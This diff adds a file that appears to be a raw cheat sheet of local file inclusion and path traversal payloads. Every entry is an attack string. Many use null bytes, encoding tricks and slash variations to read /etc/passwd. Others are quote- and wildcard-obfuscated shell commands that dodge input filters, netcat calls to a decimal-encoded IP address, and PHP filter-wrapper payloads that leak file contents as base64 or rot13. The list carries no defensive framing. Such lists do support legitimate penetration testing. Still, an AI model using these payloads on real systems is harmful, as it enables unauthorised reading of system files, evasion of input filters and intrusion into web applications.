@@ -1,0 +1,29 @@
+LFI payloads and pathtravels
+
+./../../../../../../../../../etc/passwd%00.jpg
+./../../../../../../../../../etc/passwd%00.html
+
+
+../../../../../etc/passwd
+../../../../../etc/passwd%00
+../../../../../etc/passwd%2500
+Url encode ../../../../../etc/passwd
+double url encode ../../../../../etc/passwd
+base64 encode ../../../../../etc/passwd
+../\../\../\../\../\etc/passwd
+..\/..\/..\/..\/..\/etc\passwd
+....//....//....//....//etc/passwd
+
+/b'i'n/c'a't /e't'c/p'a's's'w'd'
+/???/?at /???/????w?
+
+/usr/b'i'n/'n'c 2130706433 80
+/???/???/n? 2130706433 80
+
+
+wrapper
+&page=php://filter/resource=/etc/passwd
+&page=php://filter/read=string.rot13.resource=/etc/passwd
+&page=php://filter/convert.base64-encode/resource=/etc/passwd
+&page=pHp://FilTeR/read=string.rot13.resource=/etc/passwd
+&page=php://filter/resource=/../../../etc/passwd
